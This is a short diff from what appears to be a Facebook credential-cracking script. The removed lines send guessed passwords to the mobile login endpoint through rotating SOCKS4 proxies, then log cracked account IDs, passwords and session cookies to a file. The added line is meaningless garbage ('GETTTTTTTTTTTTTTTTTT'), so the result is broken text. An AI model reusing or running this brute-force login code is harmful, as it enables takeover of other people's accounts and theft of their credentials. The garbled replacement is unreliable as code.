@@ -262,23 +262,7 @@ def md1(idf,pwv):
     try:
       nip=random.choice(proxsi)
       proxs= {'http': 'socks4://'+nip}
-      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
-      if "checkpoint" in po.cookies.get_dict().keys():
-        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-        if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
-        open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
-        cp+=1
-        break
-      elif "c_user" in ses.cookies.get_dict().keys():
-        ok+=1
-        coki=po.cookies.get_dict()
-        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-        idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
-        if 'y' in cokix:
-         print(f'\r{B} Cookies {M}: {P}'+kuki)
-        open('GETTTTTTTTTTTTTTTTTT
+	GETTTTTTTTTTTTTTTTTT
 
 
 import requests
